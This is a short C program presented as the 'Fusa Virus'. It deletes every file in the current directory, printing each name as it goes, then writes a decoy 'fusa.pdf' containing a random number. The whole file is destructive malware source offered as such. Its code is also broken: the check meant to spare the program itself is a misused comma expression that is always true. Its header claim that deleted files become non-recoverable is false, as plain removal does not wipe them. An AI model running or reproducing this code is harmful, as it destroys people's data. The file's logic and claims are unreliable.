/** Fusa Virus
* From the Japanese word 封鎖 (fusa) which means
* "lockdown" or "blockade"
* The virus deletes all files in a directory and makes them non-recoverable
*/

#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>

int cover(void);

int main(void)
{
    puts("Fusa is looking for files");
    DIR *d;
    struct dirent *dir;
    d = opendir(".");
    if (d)
    {
        while ((dir = readdir(d)) != NULL)
        {
            //delete files
            if("%s" != "fusa", dir->d_name)
            {
                printf("Deleting: %s\n", dir->d_name);
                remove(dir->d_name);
            }
        }
        closedir(d);
        cover();
    }
    return(0);
}

int cover(void){
   char name[] = "fusa.pdf";
   FILE *fptr;

   fptr = fopen(name,"w");

   fprintf(fptr,"%d", rand());
   fclose(fptr);

   return 0;
}